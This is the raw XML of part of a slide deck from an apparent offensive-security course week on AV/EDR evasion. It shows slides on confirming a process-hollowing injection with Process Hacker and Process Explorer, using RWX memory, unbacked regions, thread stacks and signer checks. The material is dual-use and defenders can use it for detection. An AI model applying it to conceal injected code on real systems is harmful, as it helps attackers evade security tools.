                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5C0ACB3-AD14-C1BF-3020-4355865A1253}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="90100"/>
            <a:ext cx="65" cy="276999"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15151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2E832033-A7A9-852B-A18F-3AEEE947D3B7}"/>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294A1619-FD5B-369E-4748-828B2ABF76F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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677736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1" y="-54124"/>
            <a:ext cx="11954041" cy="6912124"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">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Part 3: Verification – Using Process Hacker or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Sysinternals</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 Suite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Tool 1: Process Hacker</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Process Hacker is a powerful, open-source tool that reveals what Windows Task Manager hides. It allows deep inspection of process memory, loaded DLLs, and threads.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>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Here is the verification procedure with Process Hacker:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>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Step 1: Locate the Target Process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Open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Process Hacker</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as Administrator.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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In the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Processes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tab, locate the process you hollowed (e.g., notepad.exe). Note its PID – it should match the PID printed by your hollowing tool.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>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Step 2: Inspect the Memory Regions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This is where the evidence becomes visible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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Right-click</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on the target process and select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Properties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0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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Navigate to the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Memory</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tab.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>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Here, you will see a list of all memory regions allocated to the process. Look for the following anomalies:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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Suspicious Protection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Pay close attention to regions with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Protection =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RWX (Read-Write-Execute). Legitimate code sections are usually RX (Execute-Read) or R (Read-only). The presence of an RWX region is a significant red flag.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31392981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1" y="95534"/>
            <a:ext cx="12191869" cy="6762466"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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Unbacked Memory</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Legitimate process images are typically "Image" type, mapped from a file on disk. Injected shellcode often resides in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private</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or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mapped</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memory regions that are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not backed by any file</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on disk.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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No Valid Module</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In a hollowed process, the original executable image (e.g., notepad.exe) will be missing from the memory map, replaced by the payload.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1"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Step 3: Examine the Memory Contents</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To be certain the suspicious memory region contains your shellcode:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="4572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In the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Memory</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tab, right-click on the suspicious RWX region.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="4572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Select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"Strings"</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indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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This will extract human-readable strings from that memory region. If your shellcode contains any identifiable strings (like calc.exe or your C2 domain), they will appear here.</a:t>
            </a:r>
          </a:p>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Step 4: Analyze Thread Call Stacks</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Process Hacker can also reveal if a thread is executing code from a non-image memory region.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="4572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Go to the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Threads</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tab in the process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Properties</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="4572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Look for a thread whose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start address</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points to a memory region that is not a loaded module.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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View the call stack</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This can show functions that do not map to any loaded DLL, which is highly indicative of injected shellcode.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="42473571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1" y="95534"/>
            <a:ext cx="12191803" cy="6762466"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>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Tool 2: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Sysinternals</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 Suite (Process Explorer)</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indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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Sysinternals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Process Explorer is another indispensable tool for this task. While it may not be as granular as Process Hacker, it offers several key detection methods.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>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Step 1: Find the Suspicious Process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Run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Process Explorer</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as Administrator.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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Locate your hollowed process (e.g., notepad.exe).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>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Step 2: Enable the "Lower Pane"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Press Ctrl + D or go to View -&gt; Lower Pane View -&gt; DLLs.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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This will show you all the DLLs and memory-mapped files loaded by the process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>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Look for the following:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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Missing Main Module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The process's main executable (e.g., notepad.exe) may be missing from this list, replaced by the payload's image. Process Hacker and Process Explorer retrieve a copy of the PEB (Process Environment Block) each time a process is inspected, revealing such inconsistencies.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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Unexpected DLLs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 process like Notepad should only load a specific set of system DLLs. The presence of an unusual DLL is a strong indicator of compromise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5400471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a:xfrm>
            <a:off x="109377" y="109182"/>
            <a:ext cx="11244423" cy="6067781"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>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Step 3: Analyze Process Properties</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Double-click</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the process to open its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Properties</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a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="4572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Go to the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Image</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tab.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="4572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Check the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"Path"</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and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"Command line"</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fields. In a hollowed process, these might be spoofed or inconsistent with the actual running code.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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Step 4: Check "Verified Signer"</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0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="4572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In the main Process Explorer window, go to View -&gt; Select Columns.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="4572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Add the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"Verified Signer"</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column.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
              <a:tabLst>
                <a:tab pos="457200" algn="l"/>
              </a:tabLs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A hollowed process might show as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>"Unable to Verify"</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even if it's a legitimate Windows binary, which is a significant red flag.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32525239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4124"/>
            <a:ext cx="65" cy="565449"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2C2C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42830" rIns="0" bIns="14283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AE38842D-26B6-1B1C-585D-27BDA31ABB26}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>             Thank You</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="163727261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docProps/app.xml><?xml version="1.0" encoding="utf-8"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
  <Template>Office Theme</Template>
  <TotalTime>3777</TotalTime>
  <Words>5579</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>400</Paragraphs>
  <Slides>41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Aptos</vt:lpstr>
      <vt:lpstr>Aptos Display</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Arial Black</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Menlo</vt:lpstr>
      <vt:lpstr>quote-cjk-patch</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Office Theme</vt:lpstr>
      <vt:lpstr>Week 09</vt:lpstr>
      <vt:lpstr>Month 03 | Week 09: AV/EDR Evasion &amp; Defensive Bypassing  </vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Task 01: Payload Obfuscation &amp; Signature Evasion </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Task 02: Bypassing AMSI (Antimalware Scan Interface)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09</dc:title>
  <dc:creator>Gh0stRift</dc:creator>
  <cp:lastModifiedBy>Gh0stRift</cp:lastModifiedBy>
  <cp:revision>135</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-04-20T11:05:41Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-16T04:16:06Z</dcterms:modified>
</cp:coreProperties>
</file>